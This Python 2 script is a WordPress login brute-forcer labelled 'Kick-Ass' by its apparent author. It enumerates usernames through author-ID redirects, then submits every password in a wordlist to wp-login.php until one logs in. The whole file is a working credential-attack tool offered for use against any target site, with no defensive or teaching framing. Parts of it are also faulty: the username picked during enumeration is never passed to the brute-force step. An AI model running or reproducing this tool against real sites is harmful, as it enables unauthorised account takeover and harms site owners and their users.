#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
from optparse import OptionParser
import socket
import httplib
import urllib
import urllib2
import re

usage = "python %prog -t google.com -u admin -p /Desktop/passwords.txt"

parser = OptionParser(usage=usage)
parser.add_option("-t", action="store", dest="target",
                  help="Target e.g. google.com")
parser.add_option("-u", action="store", dest="username",
                  help="Username e.g. admin")
parser.add_option("-p", action="store", dest="passwords",
                  help="Passwords file path e.g. /Desktop/passwords.txt")

(options, args) = parser.parse_args()

def find_admin(target):
	try:
		conn = httplib.HTTPConnection(target)
		conn.request("HEAD", "/wp-login.php")
		response = conn.getresponse()
		print "[+] Admin page: " + target + "/wp-login.php "
		print "[+] Response: " + str(response.status) + " " + str(response.reason) + "\n"
	except Exception as e:
		print "[!] Failed to find admin login page."
		print "[!] Exiting :-("
		sys.exit(2)

def brute_force(target,username):
	print "\n[+] Loaded " + str(passwords_count) + " passwords to test."
	print "[+] Brute forcing: " + username + "\n"
	for password in passwords:
		info = [
	     	('log', username),
	     	('pwd', password),
	     	('rememberme', 'forever'),
	     	('wp-submit', 'Login >>'),
			('redirect_to', 'wp-admin/')]
		login_form_data = urllib.urlencode(info)
		opener = urllib2.build_opener()
		try:
			source_code = opener.open("http://"+target+"/wp-login.php", login_form_data).read()
			if re.search("<STRONG>",source_code):
				print "[!] Testing: " + username + " with password: " + password + " --> FAILED"
			elif re.search("<strong>",source_code):
				print "[+] Testing username: " + username + " with password: " + password + " --> FAILED"
			else:
				print "[+] Testing username: " + username + " with password: " + password + " --> FOUND"
				sys.exit(2)
		except Exception as e:
			try:
				conn = httplib.HTTPConnection(target)
				conn.request("HEAD", "/wp-login.php")
				response = conn.getresponse()
				print "[!] Cannot connect got response: " + str(response.status) + " " + str(response.reason)
			except Exception as e:
				print "[!] Cannot connect got response: " + str(e)

def user_enumeration(target):
	print "\n"
	for i in range(1, 100):
        	if "www" in target:
            		url = "http://"+str(target)+"/"+"?author="+str(i)
			try:
		    		user = urllib.urlopen(url).geturl()
		    		if "/author/" in user:
		        		remove = user.replace("http://", "")
		        		remove2 = remove.replace(str(target), "")
		        		remove3 = remove2.replace('/author/', "")
		        		username = remove3.replace('/', "")
		        		print "[+] Username found: " + username
			except Exception as e:
				print "[!] Unknown error occured. " + str(e)
        	else:
            		url = "http://www."+str(target)+"/"+"?author="+str(i)
			try:
		    		user = urllib.urlopen(url).geturl()
		    		if "/author/" in user:
		        		remove = user.replace("http://", "")
		        		remove2 = remove.replace(str(target), "")
		        		remove3 = remove2.replace('/author/', "")
		        		username = remove3.replace('/', "")
		        		print "[+] Username found: " + username
			except Exception as e:
				print "[!] Unknown error occured. " + str(e)

	username = raw_input("Enter username you want to brute-force: > ")

def test_connection(target):
	try:
		conn = httplib.HTTPConnection(target)
		conn.request("HEAD", "/")
		response = conn.getresponse()
		print "[+] Site response: " + str(response.status) + " " + str(response.reason)
		print "[+] Scanning target..\n"
	except Exception as e:
		print "[!] Website is down or doesn't exist. Got error: " + str(e)
		print "[!] Exiting :-("
		sys.exit(2)

def banner():
        print "\n| ------------------------------------------------------------------- |"
        print "|             Kick-Ass [WordPress Brute Forcer by c3nt3rX]            |"
        print "| ------------------------------------------------------------------- |"

if len(sys.argv) < 3:
        banner()
        parser.print_help()
        sys.exit(2)

if __name__ == "__main__":
        banner()
        target = options.target
	username = options.username
	passwords = options.passwords
	try:
		passwords = open(passwords, 'r').readlines()
		passwords = map(lambda s: s.strip(), passwords)
		passwords_count = len(passwords)
	except Exception as e:
		print "[!] Cannot open file or other error."
		sys.exit(2)
	print "\n"
	test_connection(target)
	if username == "0":
		print "[!] No username specified, would you like me to enumerate usernames? [y/n]"
		choice = raw_input("> ")
		if choice == "y" or choice == "Y":
			user_enumeration(target)
		elif choice == "n" or choice == "N":
			print "[!] I'm sorry, i cannot continue without giving me a username."
			sys.exit(2)
		else:
			print "[!] Unknown option typed. Exiting :-("
			sys.exit(2)
		print "\n"
	find_admin(target)
	brute_force(target,username)

